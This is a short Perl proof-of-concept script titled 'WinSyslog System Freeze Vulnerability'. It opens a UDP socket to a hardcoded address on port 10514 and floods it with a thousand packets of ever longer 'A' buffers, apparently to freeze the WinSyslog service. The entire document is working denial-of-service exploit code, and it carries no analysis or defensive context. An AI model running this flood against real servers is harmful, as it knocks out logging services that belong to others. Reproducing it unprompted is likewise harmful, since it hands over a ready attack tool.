#!/usr/bin/perl
#WinSyslog System Freeze Vulnerability

use IO::Socket;
$host = "192.168.1.44";
$port = "10514";
$data = "A";

$socket = IO::Socket::INET->new(Proto => "udp") or die "Socket error:
$@\n";
$ipaddr = inet_aton($host) || $host;
$portaddr = sockaddr_in($port, $ipaddr);

for ($count = 0; $count < 1000; $count ++)
{
$buf = "";
$buf .= "A"x((600+$count)*4);

print "Length: ", length($buf), "\n";
send($socket, $buf, 0, $portaddr);
print "sent\n";
}

print "Done\n";
